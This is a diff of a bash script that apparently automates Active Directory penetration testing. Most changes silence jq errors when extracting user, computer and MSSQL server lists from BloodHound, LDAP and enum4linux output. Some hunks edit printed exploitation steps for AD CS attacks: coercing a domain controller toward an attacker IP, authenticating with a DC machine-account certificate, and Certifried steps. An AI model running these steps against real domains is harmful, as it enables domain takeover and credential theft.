@@ -1244,9 +1244,9 @@ bhd_enum() {
                 run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c All --log ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
-                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json >"${Users_dir}/users_list_bhd_${user_var}.txt"
-                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json >"${Servers_dir}/servers_list_bhd_${user_var}.txt"
-                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${Servers_dir}/sql_list_bhd_${user_var}.txt"
+                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
+                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
+                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
                 parse_users
                 parse_servers
             fi
@@ -1275,9 +1275,9 @@ bhd_enum_dconly() {
                 run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c DCOnly --log tee ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
-                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json >"${Users_dir}/users_list_bhd_${user_var}.txt"
-                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json >"${Servers_dir}/servers_list_bhd_${user_var}.txt"
-                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${Servers_dir}/sql_list_bhd_${user_var}.txt"
+                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
+                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
+                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
                 parse_users
                 parse_servers
             fi
@@ -1303,9 +1303,9 @@ bhdce_enum() {
                 if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
                 run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
-                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json >"${Users_dir}/users_list_bhdce_${user_var}.txt"
-                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json >"${Servers_dir}/servers_list_bhdce_${user_var}.txt"
-                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${Servers_dir}/sql_list_bhdce_${user_var}.txt"
+                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_var}.txt"
+                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_var}.txt"
+                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhdce_${user_var}.txt"
                 parse_users
                 parse_servers
             fi
@@ -1331,9 +1331,9 @@ bhdce_enum_dconly() {
                 if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
                 run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
                 cd "${current_dir}" || exit
-                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null >"${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
-                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null >"${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
-                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${Servers_dir}/sql_list_bhdce_${user_out}_${dc_domain}.txt"
+                /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
+                /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
+                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhdce_${user_out}_${dc_domain}.txt"
                 parse_users
                 parse_servers
             fi
@@ -1359,10 +1359,10 @@ ldapdomaindump_enum() {
                 run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip}:${ldap_port} -o ${DomainRecon_dir}/LDAPDomainDump" | tee "${DomainRecon_dir}/LDAPDomainDump/ldd_output_${dc_domain}.txt"
             fi
             if [ -s "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" ]; then
-                /usr/bin/jq -r ".[].attributes.sAMAccountName[]" "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" > "${Users_dir}/users_list_ldd_${dc_domain}.txt"
+                /usr/bin/jq -r ".[].attributes.sAMAccountName[]" "${DomainRecon_dir}/LDAPDomainDump/domain_users.json" 2>/dev/null > "${Users_dir}/users_list_ldd_${dc_domain}.txt"
             fi
             if [ -s "${DomainRecon_dir}/LDAPDomainDump/domain_computers.json" ]; then
-                /usr/bin/jq -r ".[].attributes.dNSHostName[]" "${DomainRecon_dir}/LDAPDomainDump/domain_computers.json" > "${Servers_dir}/servers_list_ldd_${dc_domain}.txt"
+                /usr/bin/jq -r ".[].attributes.dNSHostName[]" "${DomainRecon_dir}/LDAPDomainDump/domain_computers.json" 2>/dev/null > "${Servers_dir}/servers_list_ldd_${dc_domain}.txt"
             fi
             parse_users
             parse_servers
@@ -1383,7 +1383,7 @@ enum4linux_enum() {
             head -n 20 "${DomainRecon_dir}/enum4linux_${dc_domain}.txt" 2>&1
             echo -e "............................(truncated output)"
             if [ -s "${DomainRecon_dir}/enum4linux_${dc_domain}.json" ]; then
-                /usr/bin/jq -r ".users[].username" "${DomainRecon_dir}/enum4linux_${dc_domain}.json" >"${Users_dir}/users_list_enum4linux_${dc_domain}.txt"
+                /usr/bin/jq -r ".users[].username" "${DomainRecon_dir}/enum4linux_${dc_domain}.json" 2>/dev/null > "${Users_dir}/users_list_enum4linux_${dc_domain}.txt"
             fi
             if [ "${nullsess_bool}" == true ]; then
                 echo -e "${CYAN}[*] Guest with empty password (null session)${NC}"
@@ -1391,7 +1391,7 @@ enum4linux_enum() {
                 head -n 20 "${DomainRecon_dir}/enum4linux_guest_${dc_domain}.txt" 2>&1
                 echo -e "............................(truncated output)"
                 if [ -s "${DomainRecon_dir}/enum4linux_guest_${dc_domain}.json" ]; then
-                    /usr/bin/jq -r ".users[].username" "${DomainRecon_dir}/enum4linux_guest_${dc_domain}.json" >"${Users_dir}/users_list_enum4linux_guest_${dc_domain}.txt"
+                    /usr/bin/jq -r ".users[].username" "${DomainRecon_dir}/enum4linux_guest_${dc_domain}.json" 2>/dev/null > "${Users_dir}/users_list_enum4linux_guest_${dc_domain}.txt"
                 fi
             fi
         fi
@@ -1734,7 +1734,7 @@ ldapper_enum() {
             echo -e "${CYAN}[*] Get all users${NC}"
             run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" >"${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json"
             if [ -s "${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json" ]; then
-                /usr/bin/jq -r ".[].samaccountname" "${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json" >"${Users_dir}/users_list_ldapper_${dc_domain}.txt"
+                /usr/bin/jq -r ".[].samaccountname" "${DomainRecon_dir}/LDAPPER/users_output_${dc_domain}.json" 2>/dev/null > "${Users_dir}/users_list_ldapper_${dc_domain}.txt"
             fi
             echo -e "${CYAN}[*] Get all groups (and their members)${NC}"
             run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json" >"${DomainRecon_dir}/LDAPPER/groups_output_${dc_domain}.json"
@@ -1743,7 +1743,7 @@ ldapper_enum() {
             echo -e "${CYAN}[*] Get all computers${NC}"
             run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json" >"${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json"
             if [ -s "${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json" ]; then
-                /usr/bin/jq -r ".[].dnshostname" "${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json" >"${Servers_dir}/servers_list_ldapper_${dc_domain}.txt"
+                /usr/bin/jq -r ".[].dnshostname" "${DomainRecon_dir}/LDAPPER/computers_output_${dc_domain}.json" 2>/dev/null > "${Servers_dir}/servers_list_ldapper_${dc_domain}.txt"
             fi
             echo -e "${CYAN}[*] Get Domain/Enterprise Administrators${NC}"
             run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json" >"${DomainRecon_dir}/LDAPPER/admins_output_${dc_domain}.json"
@@ -1936,9 +1936,9 @@ adcheck_enum() {
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             run_command "${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip}" | tee "${DomainRecon_dir}/ADCheck/ADCheck_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
-            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null >"${Users_dir}/users_list_adcheck_${dc_domain}.txt"
-            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_computers.json 2>/dev/null >"${Servers_dir}/servers_list_adcheck_${dc_domain}.txt"
-            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${Servers_dir}/sql_list_adcheck_${dc_domain}.txt"
+            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null > "${Users_dir}/users_list_adcheck_${dc_domain}.txt"
+            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_adcheck_${dc_domain}.txt"
+            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_adcheck_${dc_domain}.txt"
             parse_users
             parse_servers
         fi
@@ -2056,7 +2056,7 @@ certipy_enum() {
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
     else
         echo -e "${BLUE}[*] Certipy Enumeration${NC}"
-        if [ -n "$(ls -A "${ADCS_dir}"/*_Certipy*)" ]; then
+        if [ -n "$(ls -A "${ADCS_dir}"/*_Certipy* > /dev/null 2>&1)" ]; then
             echo -e "${YELLOW}[i] Certipy results found, skipping... ${NC}"
         else
             if [ "${nullsess_bool}" == true ]; then
@@ -2175,7 +2175,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l < attacker_IP $attacker_IP > --dc-ip ${dc_ip} ${ldaps_param} ${ldapbinding_param}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
-            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
@@ -2213,7 +2213,7 @@ adcs_vuln_parse() {
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbinding_param}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip} ${ldaps_param}"
-            echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -dc-ip ${dc_ip} ${ldaps_param}"
+            echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
     fi
 
@@ -2263,7 +2263,7 @@ certifried_check() {
                     echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapbinding_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapbinding_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
                 fi
